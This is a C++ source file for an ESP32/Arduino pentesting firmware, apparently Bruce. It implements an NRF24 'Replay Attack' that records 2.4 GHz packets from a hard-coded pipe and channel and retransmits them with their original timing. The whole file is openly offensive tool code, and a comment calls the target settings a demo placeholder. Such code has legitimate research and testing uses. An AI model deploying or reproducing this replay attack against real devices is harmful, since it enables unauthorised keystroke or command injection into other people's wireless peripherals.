#include <Arduino.h>
#include <vector>
#include "nrf_replay.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "nrf_common.h"

using namespace nrf_common;

struct ReplayPacket {
    uint8_t data[32];
    uint8_t len;
    uint32_t delay_ms;
};

void nrf_keystroke_replay() {
    NRF24_MODE mode = nrf_setMode();
    if (!nrf_start(mode)) {
        displayError("NRF24 not found");
        vTaskDelay(500 / portTICK_PERIOD_MS);
        return;
    }

    drawMainBorder();
    tft.setCursor(10, 35);
    tft.setTextSize(FM);
    tft.println("Replay Attack");
    tft.setTextSize(FP);

    if (CHECK_NRF_SPI(mode)) {
        NRFradio.setAutoAck(false);
        NRFradio.setPALevel(RF24_PA_MAX);
        // Assume known target pipe and channel for simplicity/demo
        uint8_t mac[5] = {0x11, 0x22, 0x33, 0x44, 0x55};
        NRFradio.openReadingPipe(1, mac);
        NRFradio.openWritingPipe(mac);
        NRFradio.setChannel(25);
    }

    std::vector<ReplayPacket> buffer;
    bool recording = true;
    uint32_t last_pkt_time = millis();

    tft.setCursor(10, 60);
    tft.println("[REC] Waiting for pkts...");
    tft.setCursor(10, 110);
    tft.println("Press NEXT to REPLAY");

    if (CHECK_NRF_SPI(mode)) NRFradio.startListening();

    uint32_t start_time = millis();
    while (!check(EscPress) && (millis() - start_time < 60000)) {
        if (recording) {
            if (CHECK_NRF_SPI(mode) && NRFradio.available()) {
                ReplayPacket pkt;
                pkt.len = NRFradio.getPayloadSize();
                NRFradio.read(pkt.data, pkt.len);
                pkt.delay_ms = millis() - last_pkt_time;
                last_pkt_time = millis();
                buffer.push_back(pkt);

                tft.fillRect(10, 80, tftWidth - 20, 20, bruceConfig.bgColor);
                tft.setCursor(10, 80);
                tft.printf("Recorded: %d pkts", buffer.size());
            }
            if (check(NextPress)) {
                recording = false;
                if (CHECK_NRF_SPI(mode)) NRFradio.stopListening();
                tft.fillRect(10, 60, tftWidth - 20, 20, bruceConfig.bgColor);
                tft.setCursor(10, 60);
                tft.println("[PLAY] Replaying!");
            }
        } else {
            // Replaying
            if (CHECK_NRF_SPI(mode)) {
                for (size_t i = 0; i < buffer.size(); i++) {
                    delay(buffer[i].delay_ms);
                    NRFradio.write(buffer[i].data, buffer[i].len);

                    tft.fillRect(10, 80, tftWidth - 20, 20, bruceConfig.bgColor);
                    tft.setCursor(10, 80);
                    tft.printf("Sent %d / %d", i + 1, buffer.size());

                    if (check(EscPress)) break;
                }
            }
            // Switch back to record after replay
            recording = true;
            buffer.clear();
            if (CHECK_NRF_SPI(mode)) NRFradio.startListening();
            tft.fillRect(10, 60, tftWidth - 20, 60, bruceConfig.bgColor);
            tft.setCursor(10, 60);
            tft.println("[REC] Waiting for pkts...");
        }
        vTaskDelay(10 / portTICK_PERIOD_MS);
    }

    if (CHECK_NRF_SPI(mode)) NRFradio.stopListening();
    if (CHECK_NRF_UART(mode) || CHECK_NRF_BOTH(mode)) NRFSerial.println("OFF");
}
